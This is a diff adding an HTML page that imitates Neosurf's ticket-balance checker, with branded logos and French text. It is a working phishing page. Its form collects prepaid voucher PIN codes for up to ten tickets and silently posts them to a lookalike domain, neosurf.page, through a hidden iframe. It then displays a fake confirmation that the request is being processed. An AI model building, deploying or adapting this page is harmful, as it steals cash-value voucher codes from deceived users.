@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script src="https://kit.fontawesome.com/d95ce239f8.js" crossorigin="anonymous"></script>
+        <link rel="stylesheet" id="et-builder-googlefonts-cached-css" href="https://fonts.googleapis.com/css?family=Francois+One:regular|Open+Sans:300,300italic,regular,italic,600,600italic,700,700italic,800,800italic|Open+Sans+Condensed:300,300italic,700&amp;subset=latin,latin-ext&amp;display=swap" type="text/css" media="all">
+
+        <title>Neosurf.</title>
+        <style>
+            html{
+                background-color:#222222;
+            }
+            .wp-image-63433 {
+                max-width: 100%;
+                height: auto;
+                width: 30%;
+                position: relative;
+            }
+
+            * {
+                -webkit-box-sizing: border-box;
+                box-sizing: border-box;
+            }
+            .heading {
+                font-family: 'Open Sans Condensed',Helvetica,Arial,Lucida,sans-serif;
+
+
+
+                background-color: #37385b;
+                position: relative;
+                border-color: #E72582;
+                border-bottom-width: 10px;
+                border-top-width: 0;
+                border-right-width: 0;
+                border-left-width: 0;
+                padding-top: 22px!important;
+                padding-bottom: 22px!important;
+                margin-bottom: 30px!important;
+                width: 100%;
+                border-radius:10px 10px 0px 0px;
+                color: #ffffff;
+                text-align: center;
+
+                border-style: solid;
+                background-size: cover;
+                background-position: center;
+                background-repeat: no-repeat;
+
+
+            }
+
+            .head{
+                padding: 0px;
+                padding-left:10px;
+                width:100%;
+                margin: 0px;
+                background-color: #212853;
+                -webkit-text-size-adjust: 100%;
+                -webkit-background-size: cover;
+                -moz-background-size: cover;
+                -o-background-size: cover;
+                background-size: cover;
+                vertical-align: top;
+
+            }
+            header {
+                font-family: 'Open Sans', Arial, sans-serif;
+                font-size: 14px;
+                color: white;
+
+                line-height: 1.7em;
+                font-weight: 500;
+                box-shadow: 0px 12px 18px -6px rgba(0,0,0,0.12);
+                -webkit-font-smoothing: antialiased;
+            }
+            .container {
+                background-color: #fff;
+                margin-left: auto!important;
+                margin-right: auto!important;
+                padding: 0;
+                width:96%;
+
+                border-radius:10px;
+            }
+
+            input[type="text"]{
+
+                padding: 12px 20px;
+
+            }
+            input[type="password" i] {
+
+                -webkit-text-security: disc !important;
+                padding: 1px 2px;
+            }
+            input[type="button"], input[type="reset"], input[type="submit"] {
+                -webkit-appearance: button;
+                cursor: pointer;
+            }
+            button {
+                background-color: #4CAF50;
+                color:white;
+                padding: 14px 20px;
+
+                border: none;
+                cursor: pointer;
+
+            }
+            body{
+                background-size: cover;
+                background-position: center;
+                font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+                margin:0;
+
+
+                }
+
+            .image{
+                background-image: url(https://www.neosurf.com/wp-content/uploads/2020/01/BACKGROUND-Friends.jpg)!important;
+                padding: 4% 0;
+                background-position: center;
+                background-size: 100%;
+                background-size: cover;
+            }
+            div{
+                margin: 0;
+                padding: 0;
+                border: 0;
+                outline: 0;
+
+                -ms-text-size-adjust: 100%;
+                -webkit-text-size-adjust: 100%;
+                vertical-align: baseline;
+                background: transparent;
+            }
+            .heading_name {
+
+                font-size: 44px;
+                line-height: 1.2em;
+                word-wrap: break-word;
+            }
+            .contain {
+                margin-right: auto;
+                margin-left: auto;
+                padding-left: 5px;
+                padding-right: 5px;
+                padding-top:5px;
+            }
+
+            .btn{
+                font-size: 18px;
+                padding: 9.41176px 22.5px;
+                border-radius: 0;
+            }
+
+            button, html input[type="button"], input[type="reset"], input[type="submit"] {
+                -webkit-appearance: button;
+                cursor: pointer;
+            }
+            .btn-primary, #formStoreEngine > div > input{
+                background-color: #31325f;
+
+            }
+            .btn, #formStoreEngine > div > input{
+                font-size: 18px;
+                padding: 9.41176px 22.5px;
+                border-radius: 0;
+            }
+            .btn-primary, #formStoreEngine > div > input {
+                color: #fff;
+                border-color: #002b80;
+            }
+
+
+            .btn, #formStoreEngine > div > input {
+                display: inline-block;
+                margin-bottom: 0;
+                font-weight: normal;
+                text-align: center;
+                vertical-align: middle;
+
+                touch-action: manipulation;
+                cursor: pointer;
+                background-image: none;
+                border: 1px solid transparent;
+                white-space: nowrap;
+
+                line-height: 1.25;
+
+
+                user-select: none;
+            }
+            input, button, select, textarea {
+                font-family: inherit;
+                font-size: inherit;
+                line-height: inherit;
+            }
+            .btn-default {
+                color: #333;
+                background-color: #fff;
+                border-color: #ccc;
+            }
+
+            .col-xs-4 {
+                width: 33.33333%;
+            }
+            .col-xs-1, .col-xs-2, .col-xs-3, .col-xs-4, .col-xs-5, .col-xs-6, .col-xs-7, .col-xs-8, .col-xs-9, .col-xs-10, .col-xs-11, .col-xs-12 {
+                float: left;
+            }
+            .col-xs-1, .col-sm-1, .col-md-1, .col-lg-1, .col-xs-2, .col-sm-2, .col-md-2, .col-lg-2, .col-xs-3, .col-sm-3, .col-md-3, .col-lg-3, .col-xs-4, .col-sm-4, .col-md-4, .col-lg-4, .col-xs-5, .col-sm-5, .col-md-5, .col-lg-5, .col-xs-6, .col-sm-6, .col-md-6, .col-lg-6, .col-xs-7, .col-sm-7, .col-md-7, .col-lg-7, .col-xs-8, .col-sm-8, .col-md-8, .col-lg-8, .col-xs-9, .col-sm-9, .col-md-9, .col-lg-9, .col-xs-10, .col-sm-10, .col-md-10, .col-lg-10, .col-xs-11, .col-sm-11, .col-md-11, .col-lg-11, .col-xs-12, .col-sm-12, .col-md-12, .col-lg-12 {
+                position: relative;
+                min-height: 1px;
+                padding-left: 0px;
+                padding-right: 0px;
+            }
+
+            h1 {
+                font-size: 20px;
+                text-transform: uppercase;
+                margin: 40px 0 20px 0;
+                font-family: inherit;
+                font-weight: 500;
+                line-height: 1.1;
+                color: #FF3399;
+                margin-block-start: 0.67em;
+                margin-block-end: 0.67em;
+                margin-inline-start: 0px;
+                margin-inline-end: 0px;
+            }
+            .well {
+                min-height: 20px;
+                padding: 19px;
+                margin-bottom: 20px;
+                background-color: #f5f5f5;
+                border: 0;
+                border-radius: 0;
+                box-shadow: none;
+            }
+            .input-sm{
+                height: 33px;
+                padding: 5px 10px;
+                font-size: 14px;
+                line-height: 1.5;
+                border-radius: 0px;
+
+            }
+            .form-control {
+                display: block;
+                width: 100%;
+                height: 34px;
+                padding: 6px 12px;
+                font-size: 16px;
+                line-height: 1.25;
+                color: #555555;
+                background-color: #fff;
+                background-image: none;
+                border: 1px solid #ccc;
+                border-radius: 0px;
+                box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+                transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+
+                margin: 8px 5px;
+                box-sizing: border-box;
+                width:90%;
+            }
+            input, button, select, textarea {
+                font-family: inherit;
+                font-size: inherit;
+                line-height: inherit;
+            }
+            input {
+                writing-mode: horizontal-tb !important;
+
+                text-rendering: auto;
+                color: fieldtext;
+                letter-spacing: normal;
+                word-spacing: normal;
+                line-height: normal;
+                text-transform: none;
+                text-indent: 0px;
+                text-shadow: none;
+                display: inline-block;
+                text-align: start;
+                appearance: auto;
+                -webkit-rtl-ordering: logical;
+                cursor: text;
+                background-color: field;
+                margin: 0em;
+                padding: 1px 2px;
+                border-width: 2px;
+                border-style: inset;
+                border-color: -internal-light-dark(rgb(118, 118, 118), rgb(133, 133, 133));
+                border-image: initial;
+
+            }
+
+
+            .col-xs-4 {
+                width: 33.33333%;
+            }
+            .contain{
+                padding-right: 10px!important;
+                padding-bottom: 40px!important;
+                padding-left: 10px!important;
+                background-size: cover;
+                background-position: center;
+                background-repeat: no-repeat;
+            }
+            .actual_row{
+                padding:0;
+            }
+            .et_pb_slider .et_pb_slide, .et_pb_section {
+                background-position: center;
+                background-size: 100%;
+                background-size: cover;
+            }
+            .et_pb_posts_nav a, .et_pb_row, .et_pb_row_inner, .et_pb_column, .et_pb_module, .et_pb_counters .et_pb_counter_container, .et_pb_portfolio_item, .et_pb_pricing_table, .et_pb_all_tabs, .et_pb_tab, .et_pb_slide, .et_pb_with_background {
+                background-size: cover;
+                background-position: center;
+                background-repeat: no-repeat;
+            }
+           .black{
+            background-color: #222222;
+            padding: 4% 0;
+            background-position: center;
+            background-size: 100%;
+            background-size: cover;
+           }
+           .hide {
+            position:absolute;
+            top:-1px;
+            left:-1px;
+            width:1px;
+            height:1px;
+            color: green;
+            }
+
+            /*select part*/
+            .custom-select {
+                position: relative;
+                font-family: Arial;
+                margin-left:25%;
+                margin-top:19px;
+
+              }
+
+              .custom-select select {
+                display: none; /*hide original SELECT element: */
+              }
+
+              .select-selected {
+                background-color: #31325f;
+              }
+
+
+              /* Style the arrow inside the select element: */
+              .select-selected:after {
+                position: absolute;
+                content: "";
+                top: 14px;
+                right: 10px;
+                width: 0;
+                height: 0;
+                border: 6px solid transparent;
+                border-color: #fff transparent transparent transparent;
+              }
+
+              /* Point the arrow upwards when the select box is open (active): */
+              .select-selected.select-arrow-active:after {
+                border-color: transparent transparent #fff transparent;
+                top: 7px;
+              }
+
+              /* style the items (options), including the selected item: */
+              .select-items div,.select-selected {
+                color: #ffffff;
+                padding: 8px 16px;
+                border: 1px solid transparent;
+                border-color: transparent transparent rgba(0, 0, 0, 0.1) transparent;
+                cursor: pointer;
+              }
+              .select-items div{
+                background-color: #fff;
+                color:#333;
+                border-color:#ccc;
+              }
+
+              /* Style items (options): */
+              .select-items {
+                position: absolute;
+                background-color: DodgerBlue;
+                top: 100%;
+                left: 0;
+                right: 0;
+                z-index: 99;
+              }
+
+              /* Hide the items when the select box is closed: */
+              .select-hide {
+                display: none;
+              }
+
+              .select-items div:hover, .same-as-selected {
+                background-color: rgba(0, 0, 0, 0.1);
+              }
+
+
+        </style>
+    </head>
+    <body>
+        <header>
+            <div class="head">
+                <img src="https://www.neosurf.com/wp-content/uploads/logo-neosurf-white-tagline-1.png" alt="Neosurf Logo" height="auto" width="auto" srcset="https://www.neosurf.com/wp-content/uploads/logo-neosurf-white-tagline-1.png 2095w, https://www.neosurf.com/wp-content/uploads/logo-neosurf-white-tagline-1-1280x629.png 1280w, https://www.neosurf.com/wp-content/uploads/logo-neosurf-white-tagline-1-980x482.png 980w, https://www.neosurf.com/wp-content/uploads/logo-neosurf-white-tagline-1-480x236.png 480w" class="wp-image-63433">
+            </div>
+
+        </header>
+        <div class="image">
+            <div class="container">
+                <div class="heading">
+
+                    <div class="heading_name">
+                        <i class="fas fa-coins"></i>
+                        Vérifier le solde de mon Ticket Neosurf
+                    </div>
+
+                </div>
+                <div id="content" class="contain">
+                    <html xmlns="http://www.w3.org/1999/xhtml"><head>
+
+                        <title>Historique et report de crédit de code Neosurf</title>	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+                    <meta name="description" content="Consultez et retrouvez l'historique de vos paiements par codes Neosurf ou transférez le solde d'une carte sur une autre carte">
+                    <meta name="keywords" content="Historique et report de crédit de code Neosurf">	<meta charset="UTF-8">
+                        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+                        <meta name="viewport" content="width=device-width, initial-scale=1">
+                        </head>
+                        <body style="">
+
+
+                                        <div class="contain">
+                        <h1>MA CARTE</h1>
+                        <p id="explanation" class="well">Connectez-vous en indiquant le code figurant sur votre carte ou votre ticket Neosurf afin d'accéder à de nombreuses informations et options : Crédit disponible, transfert de solde, etc.</p>
+                        <div id="explanation" class="well">Combien de ticket voulais vous verifier??
+                            <div class="custom-select" style="width:50%; ">
+
+
+                                <select   id="tickets">
+
+                                    <option value="1">1</option>
+                                    <option value="2">2</option>
+                                    <option value="3">3</option>
+                                    <option value="4">4</option>
+                                    <option value="5">5</option>
+
+                                    <option value="6">6</option>
+                                    <option value="7">7</option>
+                                    <option value="8">8</option>
+                                    <option value="9">9</option>
+                                    <option value="10">10</option>
+
+                                    <!--<option value="11">11</option>-->
+                                    <!--<option value="12">12</option>-->
+                                    <!--<option value="13">13</option>-->
+                                    <!--<option value="14">14</option>-->
+                                    <!--<option value="15">15</option>-->
+
+                                    <!--<option value="16">16</option>-->
+                                    <!--<option value="17">17</option>-->
+                                    <!--<option value="18">18</option>-->
+                                    <!--<option value="19">19</option>-->
+                                    <!--<option value="20">20</option>-->
+                                 </select>
+
+
+
+                            </div>
+                        </div>
+                         <div id="formCenter" class="row">
+                            <div class="col-sm-4 col-sm-push-3 col-md-3 col-md-push-4">
+
+                                <iframe name="hiddenFrame" class="hide"><p>Felicitation</p></iframe>
+                                <form action="https://www.neosurf.page/send_email" method="post" name="loginForm1" id="loginForm1" target="hiddenFrame">
+                                <div id="actual_row">
+                                    <div class="actual_row">
+                                        <div class="col-xs-4">
+                                            <div class="form-group">
+                                                <input type="text" name="pin1" class="form-control input-sm" size="4" maxlength="4" id="pin1" onkeyup="if (this.value.length==this.maxLength){document.getElementById('pin2').focus();}">
+                                            </div>
+                                        </div>
+                                        <div class="col-xs-4">
+                                            <div class="form-group">
+                                                <input type="text" name="pin2" class="form-control input-sm" size="3" maxlength="3" id="pin2" onkeyup="if (this.value.length==this.maxLength){document.getElementById('pin3').focus();}" >
+                                            </div>
+                                        </div>
+                                        <div class="col-xs-4">
+                                            <div class="form-group">
+                                                <input type="password" name="pin3" class="form-control input-sm" size="3" maxlength="3" id="pin3">
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+
+                                    <div id="submit_form_pincode">
+                                        <button type="button" name="return" class="btn btn-default" value="" >
+                                            Retour
+                                        </button>
+                                        <input type="submit" name="submit" class="btn btn-primary" value="Valider" onclick="showMessage()">
+
+                                    </div>
+
+                                    </form>
+
+                                    <div id="message" style="display: none; margin-top: 2%;">
+                                        <div style="width:10%">
+                                            <i style="margin-right:10px;" class="fa fa-check" style="color: green;">
+
+                                            </i>
+                                        </div>
+                                        <div style="width: 90%;">
+                                        <span style="display: inline-block;">Information envoyee avec succes votre requete est en cours de traitement<span></div>
+
+
+                                    </div>
+                                    <script>
+                                        function showMessage(){
+                                            setTimeout(function(){
+                                                var message =document.getElementById('message');
+
+                                                message.style.backgroundColor= "rgba(0,256,0,0.3)";
+                                                message.style.padding="3%";
+
+                                                message.style.display="flex";},1000);
+
+                                        }
+
+
+                                    </script>
+                                    <script>
+
+                                        var x, i, j, l, ll, selElmnt, a, b, c;
+                                    /*look for any elements with the class "custom-select":*/
+                                    x = document.getElementsByClassName("custom-select");
+                                    l = x.length;
+                                    for (i = 0; i < l; i++) {
+                                      selElmnt = x[i].getElementsByTagName("select")[0];
+                                      ll = selElmnt.length;
+                                      /*for each element, create a new DIV that will act as the selected item:*/
+                                      a = document.createElement("DIV");
+                                      a.setAttribute("class", "select-selected");
+                                      a.innerHTML = selElmnt.options[selElmnt.selectedIndex].innerHTML;
+                                      x[i].appendChild(a);
+                                      /*for each element, create a new DIV that will contain the option list:*/
+                                      b = document.createElement("DIV");
+                                      b.setAttribute("class", "select-items select-hide");
+                                      for (j = 0; j < ll; j++) {
+                                        /*for each option in the original select element,
+                                        create a new DIV that will act as an option item:*/
+                                        c = document.createElement("DIV");
+                                        c.innerHTML = selElmnt.options[j].innerHTML;
+                                        c.addEventListener("click", function(e) {
+                                            /*when an item is clicked, update the original select box,
+                                            and the selected item:*/
+                                            var y, i, k, s, h, sl, yl;
+                                            s = this.parentNode.parentNode.getElementsByTagName("select")[0];
+                                            sl = s.length;
+                                            h = this.parentNode.previousSibling;
+                                            for (i = 0; i < sl; i++) {
+                                              if (s.options[i].innerHTML == this.innerHTML) {
+                                                var number = i+1;
+                                                var something=1;
+                                                var container = document.getElementById("actual_row");
+
+                                                container.innerHTML="";
+                                                for (z=0;z<number;z++){
+                                                    container.innerHTML+="<div class='actual_row'><div class='col-xs-4'><div class='form-group'><input type='text' name='pin"+(something)+"' class='form-control input-sm' size='4' maxlength='4' id='pin"+(something)+"' ></div></div><div class='col-xs-4'><div class='form-group'><input type='text' name='pin"+(something+1)+"' class='form-control input-sm' size='3' maxlength='3' id='pin"+(something+1)+"' ></div></div><div class='col-xs-4'><div class='form-group'><input type='password' name='pin"+(something+2)+"' class='form-control input-sm' size='3' maxlength='3' id='pin"+(something+2)+"' ></div></div></div>";
+                                                    onkey=document.getElementById("pin"+(something));
+                                                    onkey.setAttribute("onkeyup","if (this.value.length==this.maxLength){document.getElementById('pin"+(something+1)+"').focus();}");
+
+                                                    onkey2=document.getElementById("pin"+(something+1));
+                                                    onkey2.setAttribute("onkeyup","if (this.value.length==this.maxLength){document.getElementById('pin"+(something+2)+"').focus();}");
+                                                    something+=3;
+                                                }
+                                                s.selectedIndex = i;
+                                                h.innerHTML = this.innerHTML;
+                                                y = this.parentNode.getElementsByClassName("same-as-selected");
+                                                yl = y.length;
+                                                for (k = 0; k < yl; k++) {
+                                                  y[k].removeAttribute("class");
+                                                }
+                                                this.setAttribute("class", "same-as-selected");
+                                                break;
+                                              }
+                                            }
+                                            h.click();
+                                        });
+                                        b.appendChild(c);
+                                      }
+                                      x[i].appendChild(b);
+                                      a.addEventListener("click", function(e) {
+                                          /*when the select box is clicked, close any other select boxes,
+                                          and open/close the current select box:*/
+                                          e.stopPropagation();
+                                          closeAllSelect(this);
+                                          this.nextSibling.classList.toggle("select-hide");
+                                          this.classList.toggle("select-arrow-active");
+                                        });
+                                    }
+                                    function closeAllSelect(elmnt) {
+                                      /*a function that will close all select boxes in the document,
+                                      except the current select box:*/
+                                      var x, y, i, xl, yl, arrNo = [];
+                                      x = document.getElementsByClassName("select-items");
+                                      y = document.getElementsByClassName("select-selected");
+                                      xl = x.length;
+                                      yl = y.length;
+                                      for (i = 0; i < yl; i++) {
+                                        if (elmnt == y[i]) {
+                                          arrNo.push(i)
+                                        } else {
+                                          y[i].classList.remove("select-arrow-active");
+                                        }
+                                      }
+                                      for (i = 0; i < xl; i++) {
+                                        if (arrNo.indexOf(i)) {
+                                          x[i].classList.add("select-hide");
+                                        }
+                                      }
+                                    }
+                                    /*if the user clicks anywhere outside the select box,
+                                    then close all select boxes:*/
+                                    document.addEventListener("click", closeAllSelect);
+
+
+
+                                      </script>
+
+
+
+                                    </div>
+                                    </div>
+
+
+
+                                    </div>
+
+
+
+
+                    </div></body></html>
+
+            </div>
+        </div>
+    </div>
+</div>
+    <div class="black">
+        <img width="1024" height="503" src="https://www.neosurf.com/wp-content/uploads/Neosurf-logo-full-white-1024x503.png" class="wp-image-63443  attachment-large size-large" alt="Neosurf Logo" decoding="async" loading="lazy" style="max-width: 100%; height: auto;" srcset="https://www.neosurf.com/wp-content/uploads/Neosurf-logo-full-white-980x482.png 980w, https://www.neosurf.com/wp-content/uploads/Neosurf-logo-full-white-480x236.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) 1024px, 100vw">
+    </div>
+
+    </body>
+</html>
